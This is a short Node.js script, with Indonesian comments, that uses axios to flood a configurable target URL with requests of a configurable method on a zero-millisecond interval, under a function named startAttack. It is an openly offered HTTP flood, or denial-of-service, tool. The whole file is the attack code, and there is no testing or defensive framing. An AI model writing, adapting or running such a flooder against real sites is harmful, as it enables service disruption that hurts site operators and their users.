const axios = require('axios');

const targetURL = process.env.TARGET_URL || 'https://example.com';
const attackType = process.env.ATTACK_TYPE || 'GET';

function sendRequest(method, url) {
    return axios.request({
        method: method,
        url: url,
        headers: {
            'Connection': 'keep-alive'
        },
        timeout: 5000
    }).catch(err => {
        console.error(`Permintaan gagal: ${err.message}`);
    });
}

function startAttack() {
    const interval = setInterval(() => {
        sendRequest(attackType, targetURL);
    }, 0); // Sesuaikan interval sesuai kebutuhan

    // Opsional, Anda bisa membatasi jumlah permintaan atau menambahkan penanganan kesalahan
}

startAttack();
